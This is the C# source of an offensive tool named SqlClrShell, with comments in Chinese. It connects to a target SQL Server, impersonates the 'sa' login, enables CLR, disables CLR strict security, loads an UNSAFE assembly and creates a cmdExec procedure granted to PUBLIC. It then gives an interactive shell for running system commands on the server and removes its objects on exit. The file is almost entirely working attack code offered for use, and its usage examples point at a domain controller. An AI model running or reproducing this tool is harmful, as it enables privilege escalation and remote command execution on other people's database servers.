using System;
using System.Data;
using System.Data.SqlClient;

namespace SqlClrShell
{
    class Program
    {
        // ========== 默认值 ==========
        static string sqlServer = null;          // -h 指定，必选
        static string database = "msdb";         // -d 指定，默认 msdb
        static string author = "RasAlGhul";

        static void Main(string[] args)
        {
            // 解析命令行参数
            if (!ParseArgs(args))
            {
                PrintBanner();
                PrintUsage();
                return;
            }

            // ========== 嵌入的 DLL 十六进制字符串（使用 PowerShell 转换生成，不含 0x 前缀） ==========
            string assemblyHex = @"";

            // ========== 连接 SQL Server ==========
            string conString = $"Server={sqlServer};Database={database};Integrated Security=True;";
            using (SqlConnection con = new SqlConnection(conString))
            {
                try
                {
                    con.Open();
                    Console.WriteLine("[+] Auth success!");

                    // ---------- 0. 模拟高权限账户（sa 或具有 sysadmin 角色的账户） ----------
                    string impersonateUser = "EXECUTE AS LOGIN = 'sa';";
                    ExecuteSql(con, impersonateUser);
                    Console.WriteLine("[*] Impersonated 'sa'.");

                    // ---------- 1. 启用高级选项 ----------
                    ExecuteSql(con, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
                    Console.WriteLine("[*] Advanced options enabled.");

                    // ---------- 2. 启用 CLR 集成 ----------
                    ExecuteSql(con, "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;");
                    Console.WriteLine("[*] CLR integration enabled.");

                    // ---------- 3. 禁用 CLR 严格安全（SQL Server 2017+） ----------
                    TryExecuteSql(con, "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;");
                    Console.WriteLine("[*] CLR strict security disabled (if supported).");

                    // ---------- 4. 清理可能残留的对象 ----------
                    TryExecuteSql(con, "IF EXISTS (SELECT * FROM sys.procedures WHERE name = 'cmdExec') DROP PROCEDURE dbo.cmdExec;");
                    TryExecuteSql(con, "IF EXISTS (SELECT * FROM sys.assemblies WHERE name = 'myAssembly') DROP ASSEMBLY myAssembly;");
                    Console.WriteLine("[*] Cleaned up previous assembly/procedure.");

                    // ---------- 5. 从十六进制字符串创建程序集 ----------
                    string createAssembly = $"CREATE ASSEMBLY myAssembly FROM 0x{assemblyHex} WITH PERMISSION_SET = UNSAFE;";
                    ExecuteSql(con, createAssembly);
                    Console.WriteLine("[+] Assembly 'myAssembly' created.");

                    // ---------- 6. 基于程序集创建存储过程 ----------
                    string createProc = @"
                        CREATE PROCEDURE dbo.cmdExec
                            @execCommand NVARCHAR(4000)
                        AS EXTERNAL NAME myAssembly.StoredProcedures.cmdExec;";
                    ExecuteSql(con, createProc);
                    Console.WriteLine("[+] Procedure 'dbo.cmdExec' created.");

                    // ---------- 7. 授权执行权限（授权给 PUBLIC） ----------
                    ExecuteSql(con, "GRANT EXECUTE ON dbo.cmdExec TO PUBLIC;");
                    Console.WriteLine("[*] EXECUTE permission granted to PUBLIC.");

                    // ---------- 8. 恢复原始登录上下文 ----------
                    ExecuteSql(con, "REVERT;");
                    Console.WriteLine("[*] Reverted to original login.");

                    // ---------- 9. 交互式命令执行循环 ----------
                    Console.WriteLine("\n[*] Interactive shell ready. Type commands (EXIT to quit).");
                    while (true)
                    {
                        Console.Write("SQL> ");
                        string input = Console.ReadLine();
                        if (string.IsNullOrWhiteSpace(input)) continue;
                        if (input.Trim().Equals("EXIT", StringComparison.OrdinalIgnoreCase))
                            break;

                        try
                        {
                            using (SqlCommand cmd = new SqlCommand("dbo.cmdExec", con))
                            {
                                cmd.CommandType = CommandType.StoredProcedure;
                                cmd.Parameters.Add("@execCommand", SqlDbType.NVarChar, 4000).Value = input;

                                using (SqlDataReader reader = cmd.ExecuteReader())
                                {
                                    if (reader.Read())
                                    {
                                        string output = reader["output"] as string;
                                        if (output != null)
                                            Console.Write(output);
                                    }
                                    while (reader.NextResult()) { }
                                }
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine($"[-] SQL error: {ex.Message}");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[-] Error: {ex.Message}");
                        }
                    }

                    // ---------- 10. 清理并退出 ----------
                    Console.WriteLine("[*] Exiting shell. Cleaning up...");
                    TryExecuteSql(con, "EXECUTE AS LOGIN = 'sa';");
                    TryExecuteSql(con, "IF EXISTS (SELECT * FROM sys.procedures WHERE name = 'cmdExec') DROP PROCEDURE dbo.cmdExec;");
                    TryExecuteSql(con, "IF EXISTS (SELECT * FROM sys.assemblies WHERE name = 'myAssembly') DROP ASSEMBLY myAssembly;");
                    TryExecuteSql(con, "REVERT;");
                    Console.WriteLine("[+] Cleanup completed.");
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"[-] SQL error: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Fatal error: {ex.Message}");
                }
            }

            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        /// <summary>
        /// 命令行参数解析
        /// </summary>
        static bool ParseArgs(string[] args)
        {
            if (args.Length == 0)
                return false;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h" && i + 1 < args.Length)
                {
                    sqlServer = args[i + 1];
                    i++; // 跳过下一个参数
                }
                else if (args[i] == "-d" && i + 1 < args.Length)
                {
                    database = args[i + 1];
                    i++;
                }
                else
                {
                    // 未知参数或缺少值
                    return false;
                }
            }

            // -h 是必选，若未提供则返回 false
            return !string.IsNullOrEmpty(sqlServer);
        }

        static void PrintBanner()
        {
            Console.WriteLine(@"
 ____             ___    ____    ___           ____    __              ___    ___      
/\  _`\          /\_ \  /\  _`\ /\_ \         /\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\     __ \//\ \ \ \ \/\_\//\ \    _ __\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \   /'__`\ \ \ \ \ \ \/_/_\ \ \  /\`'__\/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \/\ \L\ \ \_\ \_\ \ \L\ \\_\ \_\ \ \/  /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \___, \/\____\\ \____//\____\\ \_\  \ `\____\ \_\ \_\ \____\/\____\/\____\
    \/_____/\/___/\ \/____/ \/___/ \/____/ \/_/   \/_____/\/_/\/_/\/____/\/____/\/____/
                 \ \_\                                                                 
                  \/_/                                                                                                  
");
            Console.WriteLine($"  SqlClrShell - Interactive SQL CLR Command Shell [{author}]");
            Console.WriteLine("  Execute system commands via SQL Server CLR assemblies.\n");
        }

        static void PrintUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  SqlClrShell.exe -h <target> [-d <database>]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  -h <target>    Target SQL Server hostname or IP (required)");
            Console.WriteLine("  -d <database>  Target database (optional, default: msdb)");
            Console.WriteLine();
            Console.WriteLine("Example:");
            Console.WriteLine("  SqlClrShell.exe -h dc01.corp1.com");
            Console.WriteLine("  SqlClrShell.exe -h 192.168.1.100 -d master");
        }

        /// <summary>
        /// 执行无结果集的 SQL 语句
        /// </summary>
        static void ExecuteSql(SqlConnection con, string sql)
        {
            using (SqlCommand cmd = new SqlCommand(sql, con))
            {
                cmd.ExecuteNonQuery();
            }
        }

        /// <summary>
        /// 尝试执行 SQL 语句，忽略错误
        /// </summary>
        static void TryExecuteSql(SqlConnection con, string sql)
        {
            try
            {
                ExecuteSql(con, sql);
            }
            catch { }
        }
    }
}